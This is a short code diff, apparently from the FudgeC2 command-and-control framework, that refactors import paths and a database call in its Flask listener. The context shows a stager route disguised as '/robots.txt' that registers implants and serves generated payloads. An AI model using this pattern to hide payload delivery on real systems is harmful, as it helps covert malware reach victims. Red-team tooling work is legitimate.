@@ -1,6 +1,6 @@
 from flask import Flask, request
-from Implant.Implant import ImplantSingleton
-from Data.Database import Database
+from FudgeC2.Implant.Implant import ImplantSingleton
+from FudgeC2.Data.Database import Database
 Imp=ImplantSingleton.instance
 
 
@@ -23,7 +23,7 @@ def add_header( r):
 
 @app.route("/robots.txt",methods=['GET'])
 def Stager():
-    NewSplicedImplantData = db.Register_NewImplantFromStagerKey(request.values['user'])
+    NewSplicedImplantData = db.implant.Register_NewImplantFromStagerKey(request.values['user'])
     if NewSplicedImplantData:
         output_from_parsed_template = Imp.GeneratePayload(NewSplicedImplantData)
     else:
